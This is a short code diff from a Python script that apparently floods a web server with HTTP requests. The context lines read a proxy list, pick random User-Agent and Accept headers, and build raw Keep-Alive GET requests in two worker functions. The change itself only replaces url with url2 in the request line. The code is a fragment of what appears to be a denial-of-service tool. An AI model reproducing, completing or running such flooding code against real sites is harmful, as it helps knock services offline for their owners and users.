@@ -203,7 +203,7 @@ acceptall = [
 proxies = open(out_file).readlines()
 
 def run():
-    get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     accept = random.choice(acceptall)
@@ -238,7 +238,7 @@ def run():
                 s.close()
 
 def run2():
-	get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	connection = "Connection: Keep-Alive\r\n"
 	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 	accept = random.choice(acceptall)
